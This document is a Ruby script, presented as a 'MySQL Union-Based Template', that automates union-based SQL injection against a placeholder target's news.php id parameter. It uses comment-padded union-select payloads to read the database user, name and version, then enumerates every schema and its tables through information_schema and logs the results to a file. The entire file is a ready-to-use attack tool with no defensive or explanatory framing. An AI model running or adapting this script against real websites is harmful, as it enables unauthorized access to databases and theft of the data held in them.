# encoding: UTF-8

# MySQL Union-Based Template
require 'net/http'
require 'uri'

$host = 'target.com'
$query = "/news.php?id=-7/**/union/**/select/**/%s,2,3,4,5,6,7,8,9,10,11%s%s--#"
info_payload = ["user()", "database()", "version()"]
db_payload = ["group_concat(schema_name)", "/**/from/**/information_schema.schemata",nil]
tb_payload = ["group_concat(table_name)", "/**/from/**/information_schema.columns", "/**/where/**/table_schema='%s'"]

# Log
f = File.open("result.txt", "w")

# Basic Info
f.write("\n====Basic Info====\n")
info_payload.each do |i|
    $path = $query % [i, nil, nil]
    res = Net::HTTP.get_response($host, $path)
    
    # Parse Data
    /class="title02">(.*)</ =~ res.body
    data = Regexp.last_match[1].strip

    puts "#{i}: #{data}"
    f.write("#{i}: #{data}\n")
end


# Database
puts "Databases: "
f.write("\n====Databases====\n")
$path = $query % db_payload
res = Net::HTTP.get_response($host, $path)
/class="title02">(.*)</ =~ res.body

databases = Regexp.last_match[1].strip.split(',')
databases.each do |i|
   puts i
   f.write("#{i}\n")
end


# Tables
databases.each do |db|
    puts "[#{db}]"
    f.write("\n[#{db}]\n")
    $path = $query % [tb_payload[0], tb_payload[1], tb_payload[2] % db]
    puts $path
    res = Net::HTTP.get_response($host, $path)
    /class="title02">(.*)</ =~ res.body
    tbs = Regexp.last_match[1].strip

    puts tbs

    tbs.split(',').uniq.each do |tb|
        f.write("#{tb}\n")
    end
end
f.close
